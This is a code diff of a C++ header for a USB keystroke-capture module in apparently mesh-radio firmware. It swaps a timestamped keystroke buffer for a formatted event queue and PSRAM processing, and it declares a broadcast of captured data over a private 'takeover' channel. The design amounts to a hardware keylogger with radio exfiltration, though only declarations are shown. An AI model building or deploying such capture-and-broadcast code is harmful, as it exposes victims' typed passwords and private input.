@@ -11,6 +11,7 @@
 #pragma once
 
 #include "../platform/rp2xx0/usb_capture/keystroke_queue.h"
+#include "../platform/rp2xx0/usb_capture/formatted_event_queue.h"
 #include "../platform/rp2xx0/usb_capture/common.h"
 #include "SinglePortModule.h"
 #include "concurrency/OSThread.h"
@@ -56,69 +57,17 @@ class USBCaptureModule : public concurrency::OSThread
 
   private:
     keystroke_queue_t *keystroke_queue;
+    formatted_event_queue_t *formatted_queue;
     capture_controller_t controller;
     bool core1_started;
 
-    /* Keystroke buffer: [epoch:10][data:480][epoch:10] */
-    char keystroke_buffer[KEYSTROKE_BUFFER_SIZE];
-    size_t buffer_write_pos;
-    bool buffer_initialized;
-    uint32_t buffer_start_epoch;
-
     /**
-     * @brief Initialize the keystroke buffer with start epoch
+     * @brief Process PSRAM buffers and transmit them
+     * Core0's main responsibility - read complete buffers from PSRAM and transmit
      */
-    void initKeystrokeBuffer();
+    void processPSRAMBuffers();
 
-    /**
-     * @brief Add a character to the keystroke buffer
-     * @param c Character to add
-     * @return true if added, false if buffer full
-     */
-    bool addToBuffer(char c);
-
-    /**
-     * @brief Handle Enter key - adds 2-byte delta timestamp
-     * @return true if added, false if buffer full
-     * @note Forces buffer finalization if delta would exceed 65000 seconds
-     */
-    bool addEnterToBuffer();
-
-    /**
-     * @brief Finalize buffer with end epoch
-     */
-    void finalizeBuffer();
-
-    /**
-     * @brief Check remaining space in buffer
-     * @return bytes available for writing
-     */
-    size_t getBufferSpace() const;
-
-    /**
-     * @brief Write epoch timestamp at current position
-     * @param pos Position to write at
-     */
-    void writeEpochAt(size_t pos);
-
-    /**
-     * @brief Write 2-byte delta at current buffer position
-     * @param delta Seconds since buffer start (0-65535)
-     */
-    void writeDeltaAt(size_t pos, uint16_t delta);
-
-    /**
-     * @brief Process keystroke events from queue
-     */
-    void processKeystrokeQueue();
-
-    /**
-     * @brief Format keystroke event for display
-     * @param event Keystroke event
-     * @param buffer Output buffer
-     * @param buffer_size Buffer size
-     */
-    void formatKeystrokeEvent(const keystroke_event_t *event, char *buffer, size_t buffer_size);
+    /* processFormattedEvents() removed - Core1 now logs directly */
 
     /**
      * @brief Broadcast buffer data over the private "takeover" channel
